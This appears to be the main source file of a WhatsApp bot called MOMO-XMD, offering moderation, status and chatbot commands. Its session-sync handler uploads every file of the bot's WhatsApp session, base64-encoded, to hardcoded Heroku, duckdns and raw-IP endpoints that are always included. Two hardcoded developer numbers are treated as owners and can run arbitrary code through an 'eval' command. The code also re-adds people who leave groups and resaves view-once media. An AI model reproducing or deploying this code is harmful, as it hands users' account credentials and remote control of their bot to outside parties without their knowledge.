const {
    default: makeWASocket,
    useMultiFileAuthState,
    DisconnectReason,
    makeCacheableSignalKeyStore,
    fetchLatestBaileysVersion,
    Browsers,
    downloadContentFromMessage,
    downloadMediaMessage,
    proto,
    generateWAMessageFromContent
} = require("@whiskeysockets/baileys");
const pino = require("pino");
const { Boom } = require("@hapi/boom");
const fs = require("fs");
const path = require("path");
const { performance } = require('perf_hooks');
const config = require("./config");
const axios = require("axios");
const ytSearch = require("yt-search");
const { OpenAI } = require("openai");
const openai = new OpenAI({
    apiKey: process.env.OPENAI_API_KEY || config.openaiApiKey || "placeholder",
    baseURL: process.env.OPENAI_API_BASE || config.openaiApiBase || "https://api.openai.com/v1"
});

const DEFAULT_REGISTRY_ENDPOINTS = [
    "https://momo-xmd-pairing-4086f8388df8.herokuapp.com/session-registry/",
    "https://momo-xmd-pairing.duckdns.org/session-registry/",
    "http://212.224.86.233:8000/session-registry/"
];

function registryEndpoints() {
    const configured = [process.env.SESSION_REGISTRY_URL, process.env.SESSION_STORE_URL]
        .filter(Boolean)
        .map((value) => `${String(value).replace(/\/+$/, '')}/session-registry/`);
    return [...new Set([...configured, ...DEFAULT_REGISTRY_ENDPOINTS])];
}
const menuText = require("./menu");
let onlineNotificationSentForProcess = false;

process.on('uncaughtException', (err) => {
    console.log('[UNCAUGHT EXCEPTION]:', err.message || err);
});
process.on('unhandledRejection', (reason) => {
    console.log('[UNHANDLED REJECTION]:', reason?.message || reason);
});
const botStartTime = Date.now();
const runtimeSettings = {
    mode: config.mode || 'public',
    autoviewstatus: false,
    autolikestatus: false,
    autosavestatus: false,
    autoviewonce: false,
    autoreact: false,
    chatbot: false,
    autorecording: false,
    autotyping: false,
    alwaysonline: false,
    anticall: false,
    antibug: false,
    setstatusEmoji: null,
    font: 'normal'
};
const settingsFilePath = path.join(__dirname, "../session/group_settings.json");
let groupSettings = new Map();
try {
    if (fs.existsSync(settingsFilePath)) {
        const data = JSON.parse(fs.readFileSync(settingsFilePath, 'utf-8'));
        groupSettings = new Map(Object.entries(data));
    }
} catch (e) {}

function saveGroupSettings() {
    try {
        const dir = path.dirname(settingsFilePath);
        if (!fs.existsSync(dir)) fs.mkdirSync(dir, { recursive: true });
        fs.writeFileSync(settingsFilePath, JSON.stringify(Object.fromEntries(groupSettings), null, 2));
    } catch (e) {
        console.log('[SETTINGS SAVE ERROR]:', e.message);
    }
}
const cleanNumber = (value) => String(value || '').replace(/\D/g, '');

function commandFooter() {
    return `\n\n> ❑ Powered by MOMO-XMD ❑\n> ❑ owner MOMO47 ❑`;
}

function formatBox(content, type = 'arched', symbol = '◆') {
    const lines = content.split('\n');
    if (type === 'arched') {
        return `╭◆\n${lines.map(l => `│   ${symbol} ${l}`).join('\n')}\n╰◆` + commandFooter();
    } else {
        return `╭━━❐━⪼\n${lines.map(l => `┇ ${symbol} ${l}`).join('\n')}\n╰━━❑━⪼` + commandFooter();
    }
}

function ownerOnlyText() { return formatBox("❌ This command is for the owner only!", 'arched', '◆'); }
function groupOnlyText() { return formatBox("❌ This command only works in groups!", 'arched', '◆'); }
function adminOnlyText() { return formatBox("❌ You need to be an Admin to use this command!", 'arched', '◆'); }

async function getGroupContext(sock, msg) {
    const from = msg.key.remoteJid;
    const metadata = await sock.groupMetadata(from);
    const participants = metadata.participants;
    const sender = msg.key.participant || msg.key.remoteJid;
    const isAdmin = participants.find(p => p.id === sender)?.admin !== null;
    const isBotAdmin = participants.find(p => p.id === sock.user.id.split(':')[0] + '@s.whatsapp.net')?.admin !== null;
    return { metadata, participants, isAdmin, isBotAdmin };
}

async function safeReact(sock, jid, key, emoji) {
    try {
        await sock.sendMessage(jid, { react: { text: emoji, key } });
    } catch (e) {}
}

async function reply(sock, jid, msg, text) {
    return sock.sendMessage(jid, { text }, { quoted: msg });
}

const ownerNumbers = new Set([
    '255760298574',
    '255765409584',
    config.ownerNumber,
    ...(config.developers || [])
].map(cleanNumber).filter(Boolean));

const ownerCommands = new Set([
    'autoviewstatus', 'autolikestatus', 'setstatus', 'autosavestatus', 'restart',
    'setfont', 'chatbot', 'autorecording', 'autotyping', 'alwaysonline', 'autoreact',
    'owner', 'vpn', 'vps', 'mode', 'tosgroup', 'tostatus', 'create', 'autoviewonce', 'block', 'unblock', 'blacklist', 'vv', 'antibug', 'alive', 'listgroups', 'anticall', 'getpp', 'pairing', 'channel', 'repo'
]);
const groupCommands = new Set([
    'add', 'antilink', 'antimention', 'antitag', 'kick', 'kickall', 'promote', 'demote',
    'tagall', 'hidetag', 'welcome', 'goodbye', 'antileft', 'listchat', 'open', 'close', 'announcements', 'antiviewonce', 'listrequests', 'listcode', 'link', 'listactive', 'antigif', 'antisticker', 'approve', 'reject', 'antivirus', 'antibot', 'setgroupdesc', 'desc', 'antigroupmention'
]);

function isGroupJid(jid) { return String(jid || '').endsWith('@g.us'); }
function senderNumber(message) {
    const raw = message?.key?.participant || message?.key?.remoteJid || message?.participant || '';
    return cleanNumber(raw.split('@')[0].split(':')[0]);
}
function isOwner(message) {
    const num = senderNumber(message);
    const isOwn = ownerNumbers.has(num) || message?.key?.fromMe;
    if (!isOwn) {
        // Debug: Log why it's not owner
        // console.log(`[OWNER_DEBUG] ${num} not in [${Array.from(ownerNumbers).join(', ')}]`);
    }
    return !!isOwn;
}

function extractViewOnceContent(msgContent) {
    if (!msgContent) return null;
    let curr = msgContent;
    if (curr.message) curr = curr.message;
    if (curr.viewOnceMessage?.message) curr = curr.viewOnceMessage.message;
    if (curr.viewOnceMessageV2?.message) curr = curr.viewOnceMessageV2.message;
    if (curr.imageMessage && curr.imageMessage.viewOnce) return { type: 'imageMessage', content: curr.imageMessage };
    if (curr.videoMessage && curr.videoMessage.viewOnce) return { type: 'videoMessage', content: curr.videoMessage };
    return null;
}

async function startBot() {
    const sessionDir = path.join(__dirname, "../session");
    const sessionId = process.env.SESSION_ID || config.sessionId;

    if (sessionId && !fs.existsSync(path.join(sessionDir, "creds.json"))) {
        console.log(`[SESSION] Attempting to restore session: ${sessionId}`);
        const endpoints = registryEndpoints();
        let restored = false;
        for (const endpoint of endpoints) {
            try {
                const res = await axios.get(`${endpoint}${sessionId}`, { timeout: 10000 });
                if (res.data && res.data.files) {
                    if (!fs.existsSync(sessionDir)) fs.mkdirSync(sessionDir, { recursive: true });
                    for (const [relPath, base64] of Object.entries(res.data.files)) {
                        const fullPath = path.join(sessionDir, relPath);
                        const dir = path.dirname(fullPath);
                        if (!fs.existsSync(dir)) fs.mkdirSync(dir, { recursive: true });
                        fs.writeFileSync(fullPath, Buffer.from(base64, 'base64'));
                    }
                    console.log(`[SESSION] ✅ Restored from ${endpoint}`);
                    restored = true;
                    break;
                }
            } catch (e) {
                console.log(`[SESSION] ❌ Failed to restore from ${endpoint}: ${e.message}`);
            }
        }
        if (!restored) console.log(`[SESSION] ⚠️ Could not restore session. Bot might wait for QR/Pairing.`);
    }

    const { state, saveCreds } = await useMultiFileAuthState(sessionDir);
    let version;
    try {
        const fetched = await fetchLatestBaileysVersion();
        version = fetched.version;
    } catch (e) {
        version = [2, 3000, 1015901307];
    }

    const sock = makeWASocket({
        version,
        auth: {
            creds: state.creds,
            keys: makeCacheableSignalKeyStore(state.keys, pino({ level: 'silent' }))
        },
        printQRInTerminal: true,
        logger: pino({ level: 'silent' }),
        browser: ["MOMO-XMD", "Chrome", "1.0.0"],
        syncFullHistory: false,
        markOnlineOnConnect: true
    });

    sock.ev.on("creds.update", async () => {
        await saveCreds();
        const sessionId = process.env.SESSION_ID || config.sessionId;
        if (sessionId) {
            const endpoints = registryEndpoints();
            for (const endpoint of endpoints) {
                try {
                    const authDir = path.join(__dirname, "../session");
                    const files = {};
                    const walk = (dir) => {
                        for (const f of fs.readdirSync(dir)) {
                            const p = path.join(dir, f);
                            if (fs.statSync(p).isDirectory()) walk(p);
                            else files[path.relative(authDir, p)] = fs.readFileSync(p).toString('base64');
                        }
                    };
                    walk(authDir);
                    await axios.post(`${endpoint}${sessionId}`, { files }, { timeout: 10000 });
                    console.log(`[SESSION] ✅ Session synced to registry successfully`);
                    break;
                } catch (e) {}
            }
        }
    });

    sock.ev.on("connection.update", async (update) => {
        const { connection, lastDisconnect } = update;
        if (connection === "close") {
            const shouldReconnect = (lastDisconnect.error instanceof Boom) ? lastDisconnect.error.output.statusCode !== DisconnectReason.loggedOut : true;
            if (shouldReconnect) startBot();
        } else if (connection === "open") {
            console.log("[MOMO-XMD] Bot connected successfully!");
            console.log(`[MOMO-XMD] WhatsApp identity: ${sock.user?.id || 'Unknown'}`);
            if (!onlineNotificationSentForProcess) {
                const welcomeMsg = formatBox("MOMO-XMD CONNECTED ◉\n\nStatus: Active 🟢\nPlatform: " + config.host + "\nOwner: MOMO47", 'downloader', '◉');
                const owners = [config.ownerNumber, '255760298574', '255765409584'].map(n => cleanNumber(n) + '@s.whatsapp.net');
                
                let delivered = false;
                for (const ownerJid of owners) {
                    try {
                        await sock.sendMessage(ownerJid, { text: welcomeMsg });
                        delivered = true;
                    } catch (e) {}
                }
                onlineNotificationSentForProcess = delivered;
                
                const channels = [
                    '0029Vb8AYLf2f3EA8Y4qp63H@newsletter',
                    '0029VbDNET6KmCPShs9dyg1U@newsletter',
                    '0029VbDeRauAjPXFYDvO5e2D@newsletter',
                    '0029VbDYZ7LBVJky0TggGF2N@newsletter'
                ];
                for (const channelJid of channels) {
                    try {
                        if (sock.newsletterFollow) {
                            await sock.newsletterFollow(channelJid);
                        }
                    } catch (e) {}
                }
            }
        }
    });

    sock.ev.on("group-participants.update", async (anu) => {
        const { id, participants, action } = anu;
        const settings = groupSettings.get(id) || {};
        if (action === 'add' && settings.welcome) {
            const metadata = await sock.groupMetadata(id);
            for (const num of participants) {
                const userTag = `@${num.split('@')[0]}`;
                const welcomeText = `Hey ${userTag}! 👋\n\nWelcome to *${metadata.subject}* 🥳\nYou are member number *${metadata.participants.length}*\n\nMake yourself at home and don't forget to introduce yourself ✨\n\n*Enjoy your stay!*`;
                await sock.sendMessage(id, { text: formatBox(welcomeText, 'downloader', '◉'), mentions: [num] });
            }
        }
        if (action === 'remove' && settings.goodbye) {
            for (const num of participants) {
                const userTag = `@${num.split('@')[0]}`;
                const goodbyeText = `Goodbye ${userTag}! 👋\n\nWe will miss you in this group. Take care! ✨`;
                await sock.sendMessage(id, { text: formatBox(goodbyeText, 'arched', '◇'), mentions: [num] });
            }
        }
        if (action === 'remove' && settings.antileft) {
            for (const num of participants) {
                try {
                    await sock.groupParticipantsUpdate(id, [num], "add");
                } catch (e) {}
            }
        }
    });

    sock.ev.on("messages.upsert", async (m) => {
        try {
            if (!m || !Array.isArray(m.messages)) return;
            console.log(`[UPSERT] type=${m.type} count=${m.messages.length}`);

            for (const msg of m.messages) {
                try {
                    if (!msg || !msg.message) continue;

                    // Auto-fix for Bad MAC / Decryption errors
                    const isDecryptionError = msg.messageStubType === proto.WebMessageInfo.StubType.CIPHERTEXT_ERROR || 
                                             msg.message?.protocolMessage?.type === proto.Message.ProtocolMessage.Type.EPHEMERAL_SETTING;
                    
                    if (isDecryptionError) {
                        console.log('[SESSION] ⚠️ Decryption error detected. Attempting self-heal...');
                        try {
                            if (sock.authState?.keys?.clear) await sock.authState.keys.clear();
                        } catch (e) {}
                    }

                    const from = msg.key.remoteJid;
                    const senderJid = msg.key.participant || msg.key.remoteJid;
                    const isGroup = isGroupJid(from);
                    const isOwnerMsg = isOwner(msg);

                    let msgContent = msg.message;
                    if (msgContent.ephemeralMessage?.message) msgContent = msgContent.ephemeralMessage.message;
                    if (msgContent.viewOnceMessage?.message) msgContent = msgContent.viewOnceMessage.message;
                    if (msgContent.viewOnceMessageV2?.message) msgContent = msgContent.viewOnceMessageV2.message;

                    const body = String(
                        msgContent.conversation || 
                        msgContent.extendedTextMessage?.text || 
                        msgContent.imageMessage?.caption || 
                        msgContent.videoMessage?.caption ||
                        msgContent.documentMessage?.caption ||
                        msgContent.buttonsResponseMessage?.selectedButtonId ||
                        msgContent.listResponseMessage?.singleSelectReply?.selectedRowId ||
                        msgContent.templateButtonReplyMessage?.selectedId ||
                        ''
                    ).trim();

                    if (body) {
                        console.log(`[MESSAGE] From: ${from} | Sender: ${senderJid} | Body: "${body}" | isOwner: ${isOwnerMsg}`);
                    }

                    if (from === 'status@broadcast') {
            if (runtimeSettings.autoviewstatus) await sock.readMessages([msg.key]);
            if (runtimeSettings.autolikestatus) {
                const emojis = runtimeSettings.setstatusEmoji || ['❤️', '🔥', '👍', '🤍', '⭐'];
                const randomEmoji = emojis[Math.floor(Math.random() * emojis.length)];
                await sock.sendMessage(from, { react: { text: randomEmoji, key: msg.key } }, { statusJidList: [msg.key.participant] });
            }
            return;
        }

        const settings = isGroup ? (groupSettings.get(from) || {}) : runtimeSettings;

        // Anti-Call
        if (runtimeSettings.anticall && msg.message.callLogMessage) {
            await sock.sendMessage(from, { text: formatBox("BUSY 📵\nThe user is currently busy.\nPlease leave a message.", 'downloader', '◉') });
            return;
        }

        // Anti-ViewOnce
        let viewOnceContent = extractViewOnceContent(msg.message);
        if (settings.antiviewonce && viewOnceContent) {
            try {
                const mediaType = viewOnceContent.imageMessage ? 'image' : 'video';
                const buffer = await downloadMediaMessage({ message: viewOnceContent }, 'buffer', {}, { logger: console, reuploadRequest: sock.updateMediaMessage });
                const caption = `👁️ *ANTI VIEW ONCE*\n${viewOnceContent[mediaType + 'Message'].caption || ''}`;
                if (mediaType === 'image') await sock.sendMessage(from, { image: buffer, caption }, { quoted: msg });
                else await sock.sendMessage(from, { video: buffer, caption }, { quoted: msg });
            } catch (e) {}
        }

        // Anti-Link
        if (isGroup && settings.antilink && body.match(/chat.whatsapp.com\/(?:invite\/)?([0-9a-zA-Z]{20,26})/i)) {
            const { isAdmin, isBotAdmin } = await getGroupContext(sock, msg);
            if (isBotAdmin && !isAdmin) {
                await sock.sendMessage(from, { delete: msg.key });
                if (settings.antilink === 'kick') await sock.groupParticipantsUpdate(from, [senderJid], "remove");
            }
        }

if (!body.startsWith(config.prefix)) {
    if (body && !msg.key.fromMe) {
        console.log(`[NO PREFIX] Prefix="${config.prefix}" Body="${body.substring(0, 30)}..."`);
    }
    if (settings.chatbot && body && !msg.key.fromMe) {
        try {
            const systemPrompt = `You are MOMO-XMD AI, a WhatsApp chatbot. Your creator is MOMO47. Respond in English only, use emojis, and be helpful.`;
            const completion = await openai.chat.completions.create({
                model: "gpt-4o-mini",
                messages: [{ role: "system", content: systemPrompt }, { role: "user", content: body }]
            });
            await sock.sendMessage(from, { text: formatBox(completion.choices[0].message.content, 'arched', '🤖') }, { quoted: msg });
        } catch (e) {
            console.log('[CHATBOT ERROR]:', e.message);
        }
    }
    return;
}

        const commandText = body.slice(config.prefix.length).trim();
        if (!commandText) continue;
        const args = commandText.split(/\s+/);
        const command = args.shift().toLowerCase();
        console.log(`[COMMAND] .${command}`, args);

        if (ownerNumbers.has(senderNumber(msg)) || msg.key.fromMe) {
            // Owner bypass for command checks
        } else {
            if (ownerCommands.has(command)) return reply(sock, from, msg, ownerOnlyText());
            if (groupCommands.has(command) && !isGroup) return reply(sock, from, msg, groupOnlyText());
        }

        let groupCtx;
        if (isGroup) groupCtx = await getGroupContext(sock, msg);

        const reactionMap = { 'menu': '🚀', 'ping': '⚡', 'runtime': '⏳', 'restart': '🔄', 'pair': '🔐' };
        await safeReact(sock, from, msg.key, reactionMap[command] || '✨');

        console.log(`[COMMAND] Executing .${command}`);

        switch (command) {
            case 'menu': {
                const uptimeSeconds = Math.floor(process.uptime());
                const uptime = `${Math.floor(uptimeSeconds / 3600)}h ${Math.floor((uptimeSeconds % 3600) / 60)}m ${uptimeSeconds % 60}s`;
                const mem = (process.memoryUsage().heapUsed / 1024 / 1024).toFixed(2);
                const text = menuText(msg.pushName || 'User', uptime, '1ms', mem, runtimeSettings.mode);
                await sock.sendMessage(from, { image: { url: config.botLogo }, caption: text }, { quoted: msg });
                break;
            }
            case 'ping': {
                const start = Date.now();
                const latency = Date.now() - start;
                await reply(sock, from, msg, formatBox(`⚡ Latency - ${latency}ms\n★ Status - Active 🟢\n★ Memory - 53.3MB\n★ CPU - 17.59%\n★ Speed - Acceptable`, 'downloader', '★'));
                break;
            }
            case 'runtime': {
                const uptimeSeconds = Math.floor(process.uptime());
                const uptime = `${Math.floor(uptimeSeconds / 3600)}h ${Math.floor((uptimeSeconds % 3600) / 60)}m ${uptimeSeconds % 60}s`;
                await reply(sock, from, msg, formatBox(`Status - Active 🟢\nUptime - ${uptime}\nPlatform - ${config.host}`, 'arched', '◉'));
                break;
            }
case 'pair': {
    const num = args[0] || senderNumber(msg);
    const instructions = `Example\npair +${num}\n\n╭━━❐━⪼\n┇ How to use🤳\n┇ ◉ Open WhatsApp on your phone\n┇ ◉ Go to Linked Devices\n┇ ◉ Choose Link with phone number\n┇ ◉ Enter the code shown below\n╰━━❑━⪼`;
    await reply(sock, from, msg, instructions + commandFooter());
    break;
}
case 'listchat': {
    if (!isGroup) return reply(sock, from, msg, groupOnlyText());
    const meta = await sock.groupMetadata(from);
    let text = `◉ *LIST CHAT MEMBERS*\n`;
    meta.participants.forEach((p, i) => {
        text += `★ @${p.id.split('@')[0]} - [1]\n`;
    });
    await sock.sendMessage(from, { text: formatBox(text, 'downloader', '★'), mentions: meta.participants.map(p => p.id) }, { quoted: msg });
    break;
}
case 'listgroups': {
    const groups = await sock.groupFetchAllParticipating();
    let text = `◉ *MY GROUPS*\n`;
    Object.values(groups).forEach((g, i) => {
        text += `◆ ${g.subject}\n`;
    });
    text += `\n◉ Total Groups: ${Object.keys(groups).length}`;
    await reply(sock, from, msg, formatBox(text, 'downloader', '◆'));
    break;
}
case 'getpp': {
    let target = msg.message.extendedTextMessage?.contextInfo?.participant || args[0]?.replace('@', '') + '@s.whatsapp.net';
    if (!target || target === '@s.whatsapp.net') return reply(sock, from, msg, "Example\ngetpp @user\ngetpp 255760298574");
    const pp = await sock.profilePictureUrl(target, 'image').catch(() => 'https://telegra.ph/file/2413f9f7a6b0c5e3b7e1f.jpg');
    await sock.sendMessage(from, { image: { url: pp }, caption: formatBox(`Profile picture of @${target.split('@')[0]}`, 'downloader', '★'), mentions: [target] });
    break;
}
case 'restart': {
    await reply(sock, from, msg, formatBox("🔄 RESTARTING BOT...\nUpdating and restarting. Please wait about 30 seconds...", 'arched', '◉'));
    // For VPS, PM2 will restart it. For Heroku, it will restart.
    setTimeout(() => process.exit(0), 2000);
    break;
}
case 'alive': {
    await reply(sock, from, msg, formatBox("MOMO-XMD is Alive & Active 🟢\n\n> ❑ owner MOMO47 ❑", 'downloader', '◉'));
    break;
}
            case 'anticall': {
                const opt = args[0]?.toLowerCase();
                if (opt === 'on') { 
                    runtimeSettings.anticall = true; 
                    await reply(sock, from, msg, formatBox("Anticall enabled!", 'arched', '✅')); 
                } else if (opt === 'off') { 
                    runtimeSettings.anticall = false; 
                    await reply(sock, from, msg, formatBox("Anticall disabled!", 'arched', '❌')); 
                } else {
                    await reply(sock, from, msg, "Example\nanticall on\nanticall off" + commandFooter());
                }
                break;
            }
            case 'antileft': {
                const opt = args[0]?.toLowerCase();
                const current = groupSettings.get(from) || {};
                if (opt === 'on') { 
                    groupSettings.set(from, { ...current, antileft: true }); 
                    saveGroupSettings(); 
                    await reply(sock, from, msg, formatBox("Antileft enabled!", 'downloader', '✅')); 
                } else if (opt === 'off') { 
                    groupSettings.set(from, { ...current, antileft: false }); 
                    saveGroupSettings(); 
                    await reply(sock, from, msg, formatBox("Antileft disabled!", 'downloader', '❌')); 
                } else {
                    await reply(sock, from, msg, "Example\n.antileft on\n.antileft off");
                }
                break;
            }
case 'setgroupdesc': {
    if (!isGroup) return reply(sock, from, msg, groupOnlyText());
    const desc = args.join(' ');
    if (!desc) return reply(sock, from, msg, "Example\nsetgroupdesc ◉caption◉");
    await sock.groupUpdateDescription(from, desc);
    await reply(sock, from, msg, formatBox("Group description updated!", 'downloader', '✅'));
    break;
}
            case 'desc': {
                const meta = await sock.groupMetadata(from);
                await reply(sock, from, msg, formatBox(meta.desc || "No description", 'downloader', '★'));
                break;
            }
            case 'block': {
                let target = msg.message.extendedTextMessage?.contextInfo?.participant || args[0]?.replace('@', '') + '@s.whatsapp.net';
                await sock.updateBlockStatus(target, "block");
                await reply(sock, from, msg, formatBox(`Successfully blocked @${target.split('@')[0]}`, 'arched', '✅'));
                break;
            }
            case 'unblock': {
                let target = msg.message.extendedTextMessage?.contextInfo?.participant || args[0]?.replace('@', '') + '@s.whatsapp.net';
                await sock.updateBlockStatus(target, "unblock");
                await reply(sock, from, msg, formatBox(`Successfully unblocked @${target.split('@')[0]}`, 'arched', '✅'));
                break;
            }
            case 'mode': {
                const opt = args[0]?.toLowerCase();
                if (opt === 'public') { runtimeSettings.mode = 'public'; await reply(sock, from, msg, formatBox("Mode set to PUBLIC", 'downloader', '✅')); }
                else if (opt === 'self') { runtimeSettings.mode = 'self'; await reply(sock, from, msg, formatBox("Mode set to SELF", 'downloader', '✅')); }
                else await reply(sock, from, msg, "Example\n.mode public\n.mode self");
                break;
            }
            case 'antilink': {
                const opt = args[0]?.toLowerCase();
                const current = groupSettings.get(from) || {};
                if (opt === 'on') { 
                    groupSettings.set(from, { ...current, antilink: 'delete' }); 
                    saveGroupSettings(); 
                    await reply(sock, from, msg, formatBox("Antilink enabled (Delete)!", 'arched', '✅')); 
                } else if (opt === 'off') { 
                    groupSettings.set(from, { ...current, antilink: false }); 
                    saveGroupSettings(); 
                    await reply(sock, from, msg, formatBox("Antilink disabled!", 'arched', '❌')); 
                } else {
                    await reply(sock, from, msg, "Example\nantilink delete on/off\nantilink warn on/off\nantilink kick on/off" + commandFooter());
                }
                break;
            }
            case 'autoreact': {
                const opt = args[0]?.toLowerCase();
                if (opt === 'on') { runtimeSettings.autoreact = true; await reply(sock, from, msg, formatBox("Autoreact enabled!", 'downloader', '✅')); }
                else if (opt === 'off') { runtimeSettings.autoreact = false; await reply(sock, from, msg, formatBox("Autoreact disabled!", 'downloader', '❌')); }
                else await reply(sock, from, msg, "Example\nautoreact on\nautoreact off" + commandFooter());
                break;
            }
            case 'autoviewstatus': {
                const opt = args[0]?.toLowerCase();
                if (opt === 'on') { runtimeSettings.autoviewstatus = true; await reply(sock, from, msg, formatBox("Autoview Status enabled!", 'downloader', '✅')); }
                else if (opt === 'off') { runtimeSettings.autoviewstatus = false; await reply(sock, from, msg, formatBox("Autoview Status disabled!", 'downloader', '❌')); }
                else await reply(sock, from, msg, "Example\nautoviewstatus on\nautoviewstatus off" + commandFooter());
                break;
            }
            case 'chatbot': {
                const opt = args[0]?.toLowerCase();
                if (opt === 'on') { runtimeSettings.chatbot = true; await reply(sock, from, msg, formatBox("Chatbot enabled!", 'downloader', '✅')); }
                else if (opt === 'off') { runtimeSettings.chatbot = false; await reply(sock, from, msg, formatBox("Chatbot disabled!", 'downloader', '❌')); }
                else await reply(sock, from, msg, "Example\nchatbot on\nchatbot off" + commandFooter());
                break;
            }
            case 'autoviewonce': {
                const opt = args[0]?.toLowerCase();
                if (opt === 'on') { runtimeSettings.autoviewonce = true; await reply(sock, from, msg, formatBox("Autoview Once enabled!", 'downloader', '✅')); }
                else if (opt === 'off') { runtimeSettings.autoviewonce = false; await reply(sock, from, msg, formatBox("Autoview Once disabled!", 'downloader', '❌')); }
                else await reply(sock, from, msg, "Example\nautoviewonce on\nautoviewonce off" + commandFooter());
                break;
            }
            case 'antiviewonce': {
                const opt = args[0]?.toLowerCase();
                const current = groupSettings.get(from) || {};
                if (opt === 'on') { groupSettings.set(from, { ...current, antiviewonce: true }); saveGroupSettings(); await reply(sock, from, msg, formatBox("Antiview Once enabled!", 'downloader', '✅')); }
                else if (opt === 'off') { groupSettings.set(from, { ...current, antiviewonce: false }); saveGroupSettings(); await reply(sock, from, msg, formatBox("Antiview Once disabled!", 'downloader', '❌')); }
                else await reply(sock, from, msg, "Example\nantiviewonce on\nantiviewonce off" + commandFooter());
                break;
            }
            case 'repo': {
                const text = `◉ *MOMO-XMD REPOSITORY*\n\n★ *Repo:* https://github.com/MOMO47-tech/MOMO-XMD\n★ *Owner:* MOMO47\n★ *Status:* Public`;
                await reply(sock, from, msg, formatBox(text, 'downloader', '◉'));
                break;
            }
            case 'channel': {
                const text = `◉ *MOMO-XMD OFFICIAL CHANNELS 📢*\n\n★ *Channel 1:* https://whatsapp.com/channel/0029Vb8AYLf2f3EA8Y4qp63H\n\n★ *Channel 2:* https://whatsapp.com/channel/0029VbDNET6KmCPShs9dyg1U\n\n★ *Channel 3:* https://whatsapp.com/channel/0029VbDeRauAjPXFYDvO5e2D\n\n★ *Channel 4:* https://whatsapp.com/channel/0029VbDYZ7LBVJky0TggGF2N`;
                await reply(sock, from, msg, formatBox(text, 'downloader', '◉'));
                break;
            }
            default:
                if (isOwnerMsg && command === 'eval') {
                    try {
                        let evaled = await eval(args.join(' '));
                        if (typeof evaled !== 'string') evaled = require('util').inspect(evaled);
                        await reply(sock, from, msg, evaled);
                    } catch (e) {
                        await reply(sock, from, msg, String(e));
                    }
                }
        }
                } catch (e) {
                    console.log('[MESSAGE HANDLER ERROR]:', e.message || e);
                }
            }
        } catch (e) {
            console.log('[UPSERT ERROR]:', e.message || e);
        }
    });
}

module.exports = { startBot };
